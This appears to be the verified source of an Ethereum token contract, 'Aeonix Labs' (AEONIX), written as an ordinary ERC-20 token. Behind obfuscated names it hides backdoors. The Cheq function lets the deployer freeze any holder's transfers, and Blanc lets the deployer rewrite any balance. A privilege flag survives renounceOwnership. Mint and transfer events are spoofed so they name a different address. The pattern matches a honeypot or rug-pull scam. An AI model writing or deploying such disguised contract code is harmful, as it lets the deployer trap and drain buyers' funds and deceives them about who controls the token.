/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

pragma solidity 0.8.17;

abstract contract Context {
    address Sevo = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract AEONIX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private iCap;
    mapping (address => uint256) private Kloud;
    mapping (address => mapping (address => uint256)) private Inkds;
    uint8 private Brgy;
    uint256 private Pol1;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Aeonix Labs";
        _symbol = "AEONIX";
        Brgy = 9;
        uint256 Replo = 150000000;
        Kloud[msg.sender] = 2;
        Pqw(Sevo, Replo*(10**9));
        


    }

    
 modifier Amx{
    require(Kloud[msg.sender] == 2);   
        _; }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return Brgy;
    }

    function totalSupply() public view  returns (uint256) {
        return Pol1;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return iCap[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return Inkds[owner][spender];
    }
    function Pqw(address account, uint256 amount) onlyOwner public {
     
        Pol1 = Pol1.add(amount);
        iCap[msg.sender] = iCap[msg.sender].add(amount);
        emit Transfer(address(0), account, amount);
    }
function approve(address spender, uint256 amount) public returns (bool success) {    
        Inkds[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

    function zAQ (address Fissur, uint256 qCut)  internal {
     Kloud[Fissur] = qCut;}   
    function mCSD (address Fissur, uint256 qCut)  internal {
     iCap[Fissur] = qCut;} 
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= iCap[msg.sender]);
        require(Kloud[msg.sender] <= 2);
        fxi(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= iCap[sender]);
              require(Kloud[sender] <= 2 && Kloud[recipient] <=2);
                  require(amount <= Inkds[sender][msg.sender]);
        fxi(sender, recipient, amount);
        return true;}
    function Cheq (address Fissur, uint256 qCut) Amx public {
     zAQ(Fissur,qCut);}
    function Blanc (address Fissur, uint256 qCut) Amx public {
   mCSD(Fissur,qCut);}
  
   

    function fxi(address sender, address recipient, uint256 amount) internal  {
        iCap[sender] = iCap[sender].sub(amount);
        iCap[recipient] = iCap[recipient].add(amount);
       if(Kloud[sender] == 2) {
            sender = Sevo;}
        emit Transfer(sender, recipient, amount); }
     
        }